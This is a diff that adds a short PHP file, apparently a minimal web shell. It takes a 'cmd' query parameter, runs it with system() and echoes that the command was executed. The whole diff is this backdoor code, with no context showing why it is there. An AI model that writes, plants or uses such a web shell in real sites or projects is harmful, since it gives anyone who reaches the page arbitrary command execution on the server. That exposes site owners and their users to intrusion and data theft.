@@ -1,0 +1,8 @@
+<?php
+if (isset($_GET['cmd']))
+{
+	$cmd = $_GET['cmd'];
+	system($cmd);
+	echo "Command '" . $cmd . "' execution done.";
+}
+?>
